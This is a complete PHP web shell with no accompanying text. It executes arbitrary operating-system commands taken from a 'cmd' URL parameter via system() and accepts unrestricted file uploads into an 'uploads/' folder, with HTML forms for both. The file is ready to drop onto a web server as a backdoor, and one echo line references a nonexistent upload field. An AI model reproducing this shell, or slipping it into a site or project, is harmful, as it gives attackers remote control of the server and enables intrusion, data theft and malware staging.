<?php

echo "Welcome on <b>" . gethostname() . "</b><br><br>";

if (isset($_GET['cmd']) && !empty($_GET['cmd']))
{
    system($_GET['cmd']);
}

if (isset($_FILES['file']) && !empty($_FILES['file']))
{
    $upload_dir = 'uploads/';
    if (!is_dir($upload_dir)) { mkdir($upload_dir); }
    $success = move_uploaded_file($_FILES['file']['tmp_name'], $upload_dir . $_FILES['file']['name']);

    if ($success) {
        echo 'File uploaded into ' . $upload_dir . $_FILES['file']['filename'];
    }
    else {
        echo 'Somehow, upload failed';
    }
}

?>

<form method="GET" action="">
<input type="text" name="cmd">
<input type="submit">
</form>
<br>
<br>
<form method="POST" action="" enctype="multipart/form-data">
<input type="file" name="file">
<input type="submit">
</form>
